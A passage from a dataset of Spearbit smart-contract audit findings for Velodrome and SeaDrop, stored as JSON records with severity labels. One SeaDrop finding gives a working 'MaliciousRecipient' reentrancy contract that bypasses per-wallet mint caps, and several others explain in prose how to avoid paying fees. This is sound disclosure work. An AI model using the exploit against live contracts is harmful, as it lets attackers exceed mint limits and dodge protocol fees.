Tokens that do not follow standard ERC20 will be locked in the contract.", "labels": ["Spearbit", "Velodrome", "Severity: Low Risk"]}, {"title": "balanceOfNFT can be made to return non-zero value via split and merge", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "Ownership Change Sidestep via Split. Splitting allows to change the ID, and have it work. This allows to sidestep this check in VotingEscrow.sol#L1052-L1055 Meaning you can always have a non-zero balance although it requires performing some work. This could be used by integrators as a way to accurately track their own voting power.", "labels": ["Spearbit", "Velodrome", "Severity: Low Risk"]}, {"title": "delegateBySig can use malleable signatures", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "Because the function delegateBySig uses ecrecover and doesn't check for the value of the sig- nature, other signatures, that have higher numerical values, which map to the same signature, could be used. Because the code uses nonces only one signature could be used per nonce.", "labels": ["Spearbit", "Velodrome", "Severity: Low Risk"]}, {"title": "Slightly Reduced Voting Power due to Rounding Error", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "Because of rounding errors, a fully locked NFT will incur a slight loss of Vote Weight (around 27 BPS). [PASS] testCompareYieldOne() (gas: 4245851) Logs: distributor.claimable(tokenId) 0 locked.amount 1000000000000000000000000 block.timsestamp 1814399 block.timsestamp 1900800 Epoch 2 distributor.claimable(tokenId) 0 locked.amount 1000000000000000000000000 escrow.userPointHistory(tokenId, 1) 0 escrow.userPointHistory(tokenId, 1) 1814399 escrow.userPointHistory(tokenId, 1) BIAS 997260281900050656907546 escrow.userPointHistory(tokenId, tokenId2) 1814399 escrow.userPointHistory(tokenId, tokenId2) BIAS 997260281900050656907546 userPoint.ts 1814399 getCursorTs(tokenId) 1814400 userPoint.ts 1814399 epochStart(tokenId) 1814400 70 userPoint.ts 1814399 ve.balanceOfNFTAt(tokenId, getCursorTs(tokenId) - 1) 997260281900050656907546 function getCursorTs(uint256 tokenId) internal returns(uint256) { IVotingEscrow.UserPoint memory userPoint = escrow.userPointHistory(tokenId, 1); console2.log(\"userPoint.ts\", userPoint.ts); uint256 weekCursor = ((userPoint.ts + WEEK - 1) / WEEK) * WEEK; uint256 weekCursorStart = weekCursor; return weekCursorStart; } function epochStart(uint256 timestamp) internal pure returns (uint256) { unchecked { return timestamp - (timestamp % WEEK); } } function testCompareYieldOne() public { skipToNextEpoch(1 days); // Epoch 1 skipToNextEpoch(-1); // last second VELO.approve(address(escrow), TOKEN_1M * 2); uint256 tokenId = escrow.createLock(TOKEN_1M, MAXTIME); uint256 tokenId2 = escrow.createLock(TOKEN_1M, 4 * 365 * 86400); uint256 mTokenId = escrow.createManagedLockFor(address(this)); console2.log(\"distributor.claimable(tokenId)\", distributor.claimable(tokenId)); console2.log(\"locked.amount\", escrow.locked(tokenId).amount); console2.log(\"block.timsestamp\", block.timestamp); minter.updatePeriod(); // Update for 1 skipToNextEpoch(1 days); // Go next epoch minter.updatePeriod(); // and update 2 console2.log(\"block.timsestamp\", block.timestamp); console2.log(\"Epoch 2\"); //@audit here we have claimable for tokenId and mTokenId IVotingEscrow.LockedBalance memory locked = escrow.locked(tokenId); console2.log(\"distributor.claimable(tokenId)\", distributor.claimable(tokenId)); console2.log(\"locked.amount\", escrow.locked(tokenId).amount); console2.log(\"escrow.userPointHistory(tokenId, 1)\", escrow.userPointHistory(tokenId, 0).ts); console2.log(\"escrow.userPointHistory(tokenId, 1)\", escrow.userPointHistory(tokenId, 1).ts); console2.log(\"escrow.userPointHistory(tokenId, 1) BIAS\", escrow.userPointHistory(tokenId, 1).bias); ,! console2.log(\"escrow.userPointHistory(tokenId, tokenId2)\", escrow.userPointHistory(tokenId2, 1).ts); ,! console2.log(\"escrow.userPointHistory(tokenId, tokenId2) BIAS\", ,! escrow.userPointHistory(tokenId2, 1).bias); console2.log(\"getCursorTs(tokenId)\", getCursorTs(tokenId)); console2.log(\"epochStart(tokenId)\", epochStart(getCursorTs(tokenId))); console2.log(\"ve.balanceOfNFTAt(tokenId, getCursorTs(tokenId) - 1)\", ,! escrow.balanceOfNFTAt(tokenId, getCursorTs(tokenId) - 1)); } 71", "labels": ["Spearbit", "Velodrome", "Severity: Low Risk"]}, {"title": "Some setters cannot be changed by governance", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "It was found that some setters, related to emergencyCouncil and Team can only be called by the current role owner. It may be best to allow Governance to also be able to call such setters as a way to allow it to override or replace a misaligned team. The Emergency Council can kill gauges, preventing those gauges from receiving emissions. Voter.sol#L151-L155. function setEmergencyCouncil(address _council) public { if (_msgSender() != emergencyCouncil) revert NotEmergencyCouncil(); if (_council == address(0)) revert ZeroAddress(); emergencyCouncil = _council; } The team can simply change the ArtProxy which is a cosmetic aspect of Voting Escrow. VotingEscrow.sol#L241-L245 function setTeam(address _team) external { if (_msgSender() != team) revert NotTeam(); if (_team == address(0)) revert ZeroAddress(); team = _team; }", "labels": ["Spearbit", "Velodrome", "Severity: Low Risk"]}, {"title": "Rebase Rewards distribution is shifted by one week, allowing new depositors to receive unfair yield initially (which they'll give back after they withdraw)", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "The finding is not particularly dangerous but it is notable that because Reward will allow claiming of rewards on the following Epoch, and because Rebase rewards from the Distributor Distributor.claim are distributed based on the balance at the last second of the previous epoch, a desynchronization in how rewards are distributed will happen. This will end up being fair in the long run however here's an illustrative scenario:  Locker A has a small lock, they wish to increase the amount they have locked.  They increase the amount but miss out on rebase rewards (because they are based on their balance at the last second of the previous epoch).  They decide to depositManaged which will distribute rewards based on their current balance, meaning they will \"steal\" a marginal part of the yield. 72  The next epoch, their weight will help increase the yield for everyone, and because Rebasing Rewards are distributed with a week of delay, they will eventually miss out on a similar proportion of yield they \"stole\".", "labels": ["Spearbit", "Velodrome", "Severity: Low Risk"]}, {"title": "AutoCompounder can be created without admin", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "Creating an AutoCompounder contract without an _admin by passing address(0) through AutoCom- pounderFactory is possible. This will break certain functionalities in the AutoCompounder.", "labels": ["Spearbit", "Velodrome", "Severity: Low Risk"]}, {"title": "claim and claimMany functions will revert when called in end lock time", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "block.timestamp >= oldLocked.end. If _timestamp == _locked.end, then depositFor() will be called but this will revert as", "labels": ["Spearbit", "Velodrome", "Severity: Low Risk"]}, {"title": "Malicious Pool Factory can be used to prevent new pools from being voted on as well as brick voting locks", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "Because gauges[_pool] can only be set once in the voter, governance has the ability to introduce a malicious factory, that will revert on command as a way to prevent normal protocol functionality as well as prevent depositors that voted on these from ever being able to unlock their NFTs  ve.withdraw requires not having voted.  To remove voting reset is called, which in turn calls IReward(gaugeToFees[gauges[_pool]])._with- draw(uint256(_votes), _tokenId);.  If a malicious gaugeToFees contract is deployed, the tokenId won't be able to ever set voted to false preventing the ability from ever withdrawing. 73", "labels": ["Spearbit", "Velodrome", "Severity: Low Risk"]}, {"title": "Pool will stop working if a pausable / blockable token is blocked", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "Some tokens are pausable or implement a block list (e.g. USDC), if such a token is part of a Pool, and the Pool is blocked, the Pool will stop working. It's important to notice that the LP token, which wraps a deposit will still be transferable and the composability with Gauges and Reward Contracts will not be broken even when the pool is unable to function.", "labels": ["Spearbit", "Velodrome", "Severity: Low Risk"]}, {"title": "Use ClonesWithImmutableArgs in AutoCompounderFactory saves gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "The AutoCompounderFactory can utilize ClonesWithImmutableArgs to deploy new AutoCompounder contracts. This would save a lot of gas compared to the current implementation.", "labels": ["Spearbit", "Velodrome", "Severity: Gas Optimization"]}, {"title": "Convert hardcoded route to internal function in CompoundOptimizer", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "All of the hardcoded route setups can be converted to an internal function with hardcoded values.", "labels": ["Spearbit", "Velodrome", "Severity: Gas Optimization"]}, {"title": "Early return in supplyAt save gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "To save gas, you can return in case of _epoch is equal to zero can be made before cache _point.", "labels": ["Spearbit", "Velodrome", "Severity: Gas Optimization"]}, {"title": "Approved User could Split NFTs and be unable to continue operating", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "An approved user can be approved via approve, the storage value set is idToApprovals[_tokenId] = _approved; Splitting will create two new NFTs that will be sent to the owner. This means that an approved user would be able to split the NFTs on behalf of the owner, however, in doing so they would lose ownership of the NFTs, being unable to continue using them during the TX", "labels": ["Spearbit", "Velodrome", "Severity: Informational"]}, {"title": "Add sweep function to CompoundOptimizer", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "Some tokens may be completely illiquid, may not be worth auto-compounding so it would be best to also allow a way to sweep tokens out to the owner for some tokens. Examples:  Airdrops / Extra rewards.  Very new tokens that the owner wants to farm instead of dump.", "labels": ["Spearbit", "Velodrome", "Severity: Informational"]}, {"title": "Allow Manual Suggestion of Pair in AutoCompounder", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "Allow manual suggestion of token pairs such as USDC, USDT, LUSD, and wBTC. It may be best to pass a list of pairs as parameters to check for additional tokens. Ultimately, if a suggested pair offers a better price, there's no reason not to allow it. The caller should be able to pass a suggested optimal route, which can then be compared against other routes. Use whichever route is best. If the user's suggested route is the best one, use theirs and ensure that the swap goes through.", "labels": ["Spearbit", "Velodrome", "Severity: Informational"]}, {"title": "Check if owner exists in split function", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "In case the NFT does not exist, the _ownerOf(_from) function returns the zero address. This check is satisfied if canSplit has been toggled. However, this does not lead to any issues because the _- isApprovedOrOwner() check will revert as intended, and there is no amount in the lock. It may be a good idea to update the _ownerOf() function to revert if there is no owner for the NFT.", "labels": ["Spearbit", "Velodrome", "Severity: Informational"]}, {"title": "Velo and Veto Governor do not use MetaTX Context", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "These two contracts use Context instead of ERC2771Context.", "labels": ["Spearbit", "Velodrome", "Severity: Informational"]}, {"title": "SinkManager is depositing to Gauge without using the TokenId", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "gauge.deposit allows to specify a tokenId, but the field is unused", "labels": ["Spearbit", "Velodrome", "Severity: Informational"]}, {"title": "ERC721SeaDrop's modifier onlyOwnerOrAdministrator would allow either the owner or the admin to override the other person's config parameters.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "The following 4 external functions in ERC721SeaDrop have the onlyOwnerOrAdministrator modifier which allows either one to override the other person's work.  updateAllowedSeaDrop  updateAllowList  updateDropURI  updateSigner That means there should be some sort of off-chain trust established between these 2 entities. Otherwise, there are possible vectors of attack. Here is an example of how the owner can override AllowListData.merkleRoot and the other fields within AllowListData to generate proofs for any allowed SeaDrop's mintAllowList endpoint that would have MintParams.feeBps equal to 0: 1. The admin calls updateAllowList to set the Merkle root for this contract and emit ERC721SeaDrop.updateAllowList: SeaDrop.sol#L827 the other parameters as logs. for an allowed SeaDrop implementation The SeaDrop endpoint being called by 2. The owner calls updateAllowList but this time with new parameters, specifically a new Merkle root that is computed from leaves that have MintParams.feeBps == 0. 3. Users/minters use the generated proof corresponding to the latest allow list update and pass their mintParams.feeBps as 0. And thus avoiding the protocol fee deduction for the creatorPaymentAddress (SeaDrop.sol#L187-L194).", "labels": ["Spearbit", "Seadrop", "Severity: High Risk"]}, {"title": "Reentrancy of fee payment can be used to circumvent max mints per wallet check", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "In case of a mintPublic call, the function _checkMintQuantity checks whether the minter has exceeded the parameter maxMintsPerWallet, among other things. However, re-entrancy in the above fee dispersal mechanism can be used to circumvent the check. The following is an example contract that can be employed by the feeRecipent (assume that maxMintsPerWallet is 1): 7 contract MaliciousRecipient { bool public startAttack; address public token; SeaDrop public seaDrop; fallback() external payable { if (startAttack) { startAttack = false; seaDrop.mintPublic{value: 1 ether}({ nftContract: token, feeRecipient: address(this), minterIfNotPayer: address(this), quantity: 1 }); } } // Call `attack` with at least 2 ether. function attack(SeaDrop _seaDrop, address _token) external payable { token = _token; seaDrop = _seaDrop; startAttack = true; _seaDrop.mintPublic{value: 1 ether}({ nftContract: _token, feeRecipient: address(this), minterIfNotPayer: address(this), quantity: 1 }); token = address(0); seaDrop = SeaDrop(address(0)); } } This is especially bad when the parameter PublicDrop.restrictFeeRecipients is set to false, in which case, anyone can circumvent the max mints check, making it a high severity issue. In the other case, only privileged users, i.e., should be part of _allowedFeeRecipients[nftContract] mapping, would be able to circumvent the check--lower severity due to needed privileged access. Also, creatorPaymentAddress can use re-entrancy to get around the same check. See SeaDrop.sol#L571.", "labels": ["Spearbit", "Seadrop", "Severity: High Risk"]}, {"title": "Cross SeaDrop reentrancy", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "The contract that implements IERC721SeaDrop can work with multiple Seadrop implementations, for example, a Seadrop that accepts ETH as payment as well as another Seadrop contract that accepts USDC as payment at the same time. This introduces the risk of cross contract re-entrancy that can be used to circumvent the maxMintsPerWallet check. Here's an example of the attack: 1. Consider an ERC721 token that that has two allowed SeaDrop, one that accepts ETH as payment and the other that accepts USDC as payment, both with public mints and restrictedFeeRecipients set to false. 2. Let maxMintPerWallet be 1 for both these cases. 3. A malicious fee receiver can now do the following:  Call mintPublic for the Seadrop with ETH fees, which does the _checkMintQuantity check and trans- fers the fees in ETH to the receiver.  The receiver now calls mintPublic for Seadrop with USDC fees, which does the _checkMintQuantity check that still passes.  The mint succeeds in the Seadrop-USDC case.  The mint succeeds in the Seadrop-ETH case.  The minter has 2 NFTs even though it's capped at 1. Even if a re-entrancy lock is added in the SeaDrop, the same issue persists as it only enters each Seadrop contract once.", "labels": ["Spearbit", "Seadrop", "Severity: Medium Risk"]}, {"title": "Lack of replay protection for mintAllowList and mintSigned", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "merkle proofs) there are no checks that prevent re-using the same signature or Merkle proof multiple This is indirectly enforced by the _checkMintQuantity function that checks the mint statistics times. using exceeds maxMintsPerWallet. Replays can happen if a wallet does not claim all of maxMintsPerWallet in one transaction. For example, assume that maxMintsPerWallet is set to 2. A user can call mintSigned with a valid signature and quantity = 1 twice. IERC721SeaDrop(nftContract).getMintStats(minter) reverting quantity and the if Typically, contracts try to avoid any forms of signature replays, i.e., a signature can only be used once. This simpli- fies the security properties. In the current implementation of the ERC721Seadrop contract, we couldn't see a way to exploit replay protection to mint beyond what could be minted in a single initial transaction with the maximum value of quantity supplied. However, this relies on the contract correctly implementing IERC721SeaDrop.getMintStats.", "labels": ["Spearbit", "Seadrop", "Severity: Medium Risk"]}, {"title": "The digest in SeaDrop.mintSigned is not calculated correctly according to EIP-712", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "mintParams in the calculation of the digest in mintSigned is of struct type, so we would need to calculate and use its hashStruct , not the actual variable on its own.", "labels": ["Spearbit", "Seadrop", "Severity: Medium Risk"]}, {"title": "ERC721A has mint caps that are not checked by ERC721SeaDrop", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "ERC721SeaDrop inherits from ERC721A which packs balance, numberMinted, numberBurned, and an extra data chunk in 1 storage slot (64 bits per substorage) for every address. This would add an inherent cap of 264 (cid:0) 1 to all these different fields. Currently, there is no check in ERC721A's _mint for quantity nor in ERC721SeaDrop's mintSeaDrop function. Also, if we almost reach the max cap for a balance by an owner and someone else transfers a token to this owner, there would be an overflow for the balance and possibly the number of mints in the _packedAddressData. The overflow could possibly reduce the balance and the numberMinted to a way lower numer and numberBurned to a way higher number", "labels": ["Spearbit", "Seadrop", "Severity: Medium Risk"]}, {"title": "ERC721SeaDrop owner can choose an address they control as the admin when the constructor is called.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "The owner/creator can call the contract directly (skip using the UI) and set the administrator as themselves or another address that they can control. Then after they create a PublicDrop or TokenGatedDrop, they can call either updatePublicDropFee or updateTokenGatedDropFee and set the feeBps to  zero  or another number and also call the updateAllowedFeeRecipient to add the same or another address they control as a feeRecipient. This way they can circumvent the protocol fee.", "labels": ["Spearbit", "Seadrop", "Severity: Medium Risk"]}, {"title": "ERC721SeaDrop's admin would need to set feeBps manually after/before creation of each drop by the owner", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "When an owner of a ERC721SeaDrop token creates either a public or a token gated drop by calling updatePublicDrop or updateTokenGatedDrop, the PublicDrop.feeBps/TokenGatedDropStage.feeBps is initially set to 0. So the admin would need to set the feeBps parameter at some point (before or after). Forgetting to set this parameter results in not receiving the protocol fees.", "labels": ["Spearbit", "Seadrop", "Severity: Medium Risk"]}, {"title": "owner can reset feeBps set by admin for token gated drops", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "Only the admin can call updateTokenGatedDropFee to update feeBps. However, the owner can call updateTokenGatedDrop(address seaDropImpl, address allowedNftToken, TokenGatedDropStage calldata drop- Stage) twice after that to reset the feeBps to 0 for a drop. 1. Once with dropStage.maxTotalMintableByWallet equal to 0 to wipe out the storage on the SeaDrop side. 2. Then with the same allowedNftToken address and the other desired parameters, which would retrieve the previously wiped out drop stage data (with feeBps equal to 0). NOTE: This type of attack does not apply to updatePublicDrop and updatePublicDropFee pair. Since updatePub- licDrop cannot remove or update the feeBps. Once updatePublicDropFee is called with a specific feeBps that value remains for this ERC721SeaDrop contract-related storage on SeaDrop (_publicDrops[msg.sender] = pub- licDrop). And any number of consecutive calls to updatePublicDrop with any parameters cannot change the already set feeBps.", "labels": ["Spearbit", "Seadrop", "Severity: Medium Risk"]}, {"title": "Update the start token id for ERC721SeaDrop to 1", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "ERC721SeaDrop's mintSeaDrop uses _mint from ERC721A library which starts the token ids for minting from 0. /// contracts/ERC721A.sol#L154-L156 /** * @dev Returns the starting token ID. * To change the starting token ID, please override this function. */ function _startTokenId() internal view virtual returns (uint256) { return 0; }", "labels": ["Spearbit", "Seadrop", "Severity: Low Risk"]}, {"title": "Update the ERC721A library due to an unpadded toString() function", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "The audit repo uses ERC721A at dca00fffdc8978ef517fa2bb6a5a776b544c002a which does not add a trailing zero padding to the returned string. Some projects have had issues reusing the toString() where the off-chain call returned some dirty-bits at the end (similar to Seaport 1.0's name()).", "labels": ["Spearbit", "Seadrop", "Severity: Low Risk"]}, {"title": "Warn contracts implementing IERC721SeaDrop to revert on quantity == 0 case", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "There are no checks in Seadrop that prevents minting for the case when quantity == 0. This would call the function mintSeadrop(minter, quantity) for a contract implementing IERC721SeaDrop with quantity == 0. It is up to the implementing contract to revert in such cases. The ERC721A library reverts when quantity == 0--the correct behaviour. However, there has been instances in the past where ignoring quantity == 0 checks have led to security issues.", "labels": ["Spearbit", "Seadrop", "Severity: Low Risk"]}, {"title": "Missing parameter in _SIGNED_MINT_TYPEHASH", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "A parameter is missing (uint256 maxTokenSupplyForStage) and got caught after reformatting.", "labels": ["Spearbit", "Seadrop", "Severity: Low Risk"]}, {"title": "Missing address(0) check", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "All update functions having an address as an argument check them against address(0). This is missing in updateTokenGatedDrop. This is also not protected in ERC721SeaDrop.sol#updateTokenGatedDrop(), so address(0) could pass as a valid value.", "labels": ["Spearbit", "Seadrop", "Severity: Low Risk SeaDrop.sol#L856, SeaDrop.sol#L907-L909, SeaDrop.sol#L927-L929, SeaDrop.sol#L966-L968,"]}, {"title": "Missing boundary checks on feeBps", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "There's a missing check when setting feeBps from ERC721SeaDrop.sol while one exists when the value is used at a later stage in Seadrop.sol, which could cause a InvalidFeeBps error.", "labels": ["Spearbit", "Seadrop", "Severity: Low Risk"]}, {"title": "Upgrade openzeppelin/contracts's version", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "There are known vulnerabilities in the current @openzeppelin/contracts version used. This affects SeaDrop.sol with a potential Improper Verification of Cryptographic Signature vulnerability as ECDSA.recover is used.", "labels": ["Spearbit", "Seadrop", "Severity: Low Risk"]}, {"title": "struct TokenGatedDropStage is expected to fit into 1 storage slot", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "struct TokenGatedDropStage is expected to be tightly packed into 1 storage slot, as per announced in its @notice tag. However, the struct actually takes 2 slots. This is unexpected, as only one slot is loaded in the dropStageExists assembly check.", "labels": ["Spearbit", "Seadrop", "Severity: Low Risk"]}, {"title": "Avoid expensive iterations on removal of list elements by providing the index of element to be removed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "Iterating through an array (address[] storage enumeration) to find the desired element (address toRemove) can be an expensive operation. Instead, it would be best to also provide the index to be removed along with the other parameters to avoid looping over all elements. Also note in the case of _removeFromEnumeration(signer, enumeratedStorage), hopefully, there wouldn't be too many signers corresponding to a contract. So practically, this wouldn't be an issue. But something to note. Although the owner or admin can stuff the signer list with a lot of signers as the other person would not be able to remove from the list (DoS attack). For example, if the owner has stuffed the signer list with malicious signers, the admin would not be able to remove them.", "labels": ["Spearbit", "Seadrop", "Severity: Gas Optimization"]}, {"title": "mintParams.allowedNftToken should be cached", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "mintParams.allowedNftToken is accessed several times in the mintAllowedTokenHolder function. It would be cheaper to cache it: // Put the allowedNftToken on the stack for more efficient access. address allowedNftToken = mintParams.allowedNftToken;", "labels": ["Spearbit", "Seadrop", "Severity: Gas Optimization"]}, {"title": "Immutables which are calculated using keccak256 of a string literal can be made constant.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "Since Solidity 0.6.12, keccak256 expressions are evaluated at compile-time: Code Generator: Evaluate keccak256 of string literals at compile-time. The suggestion of marking these expressions as immutable to save gas isn't true for compiler versions >= 0.6.12. As a reminder, before that, the occurrences of constant keccak256 expressions were replaced by the expressions instead of the computed values, which added a computation cost.", "labels": ["Spearbit", "Seadrop", "Severity: Informational"]}, {"title": "Combine a pair of mapping to a list and mapping to a mapping into mapping to a linked-list", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "SeaDrop uses 3 pairs of mapping to a list and mapping to a mapping that can be combined into just one mapping. The pairs: 1. _allowedFeeRecipients and _enumeratedFeeRecipients 2. _signers and _enumeratedSigners 3. _tokenGatedDrops and _enumeratedTokenGatedTokens Here we have variables that come in pairs. One variable is used for data retrievals (a flag or a custom struct) and the other for iteration/enumeration. mapping(address => mapping(address => CustomStructOrBool)) private variable; mapping(address => address[]) private _enumeratedVariable;", "labels": ["Spearbit", "Seadrop", "Severity: Gas Optimization"]}, {"title": "The onlyAllowedSeaDrop modifier is redundant", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "The onlyAllowedSeaDrop modifier is always used next to another one (onlyOwner, onlyAdminis- trator or onlyOwnerOrAdministrator). As the owner, which is the least privileged role, already has the privilege to update the allowed SeaDrop registry list for this contract (by calling updateAllowedSeaDrop), this makes this second modifier redundant.", "labels": ["Spearbit", "Seadrop", "Severity: Gas Optimization"]}, {"title": "Combine _allowedSeaDrop and _enumeratedAllowedSeaDrop in ERC721SeaDrop to save storage and gas.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "Combine _allowedSeaDrop and _enumeratedAllowedSeaDrop into just one variable using a cyclic linked-list data structure. This would reduce storage space and save gas when storing or retrieving parameters.", "labels": ["Spearbit", "Seadrop", "Severity: Gas Optimization"]}, {"title": "<array>.length should not be looked up in every loop of a for-loop", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "Reading an array's length at each iteration of a loop consumes more gas than necessary.", "labels": ["Spearbit", "Seadrop", "Severity: Gas Optimization"]}, {"title": "A storage pointer should be cached instead of computed multiple times", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "Caching a mapping's value in a local storage variable when the value is accessed multiple times saves gas due to not having to perform the same offset calculation every time.", "labels": ["Spearbit", "Seadrop", "Severity: Gas Optimization"]}, {"title": "Comparing a boolean to a constant", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "Comparing to a constant (true or false) is a bit more expensive than directly checking the returned boolean value.", "labels": ["Spearbit", "Seadrop", "Severity: Gas Optimization"]}, {"title": "mintAllowList, mintSigned, or mintAllowedTokenHolder have an inherent cap for minting", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "mintAllowedTokenHolder is stored in a uint40 (after this audit uint32) which limits the maximum token id that can be minted using mintAllowList, mintSigned, or mintAllowedTokenHolder.", "labels": ["Spearbit", "Seadrop", "Severity: Informational"]}, {"title": "Consider replacing minterIfNotPayer parameter to always correspond to the minter", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "Currently, the variable minterIfNotPayer is treated in the following way: if the value is 0, then msg.sender would be considered as the minter. Otherwise, minterIfNotPayer would be considered as the minter. The logic can be simplified to always treat this variable as the minter. The 0 can be replaced by setting msg.sender as minterIfNotPayer. The variable should then be renamed as well--we recommend calling it minter afterwards.", "labels": ["Spearbit", "Seadrop", "Severity: Informational"]}, {"title": "The interface IERC721ContractMetadata does not extend IERC721 interface", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "The current interface IERC721ContractMetadata does not include the ERC-721 functions. As a comparision, OpenZeppelin's IERC721Metadata.sol extends the IERC721 interface.", "labels": ["Spearbit", "Seadrop", "Severity: Informational"]}, {"title": "Add unit tests for mintSigned and mintAllowList in SeaDrop", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "The only test for the mintSigned and the mintAllowList functions are fuzz tests.", "labels": ["Spearbit", "Seadrop", "Severity: Informational"]}, {"title": "Rename a variable with a misleading name", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "enumeratedDropsLength variable name in SeaDrop._removeFromEnumeration is a bit misleading since _removeFromEnumeration is used also for signer lists, feeRecipient lists, etc..", "labels": ["Spearbit", "Seadrop", "Severity: Informational"]}, {"title": "The protocol rounds the fees in the favour of creatorPaymentAddress", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "The feeAmount calculation rounds down, i.e., rounds in the favour of creatorPaymentAddress and against feeRecipient. For a minuscule amount of ETH (price such that price * feeBps < 10000), the fees received by the feeRecipient would be 0. An interesting case here would be if the value quantity * price * feeBps is greater than or equal to 10000 and price * feeBps < 10000. In this case, the user can split the mint transaction into multiple transactions to skip the fees. However, this is unlikely to be profitable, considering the gas overhead involved as well as the minuscule amount of savings.", "labels": ["Spearbit", "Seadrop", "Severity: Informational"]}, {"title": "Consider using type(uint).max as the magic value for maxTokenSupplyForStage instead of 0", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "The value 0 is currently used as magic value to mean that maxTokenSupplyForStage to mean that the check quantity + currentTotalSupply > maxTokenSupplyForStage. However, the value type(uint).max is a more appropriate magic value in this case. This also avoids the need for additional branching if (maxTo- kenSupplyForStage != MAGIC_VALUE) as the condition quantity + currentTotalSupply > type(uint).max is never true.", "labels": ["Spearbit", "Seadrop", "Severity: Informational"]}, {"title": "Missing edge case tests on 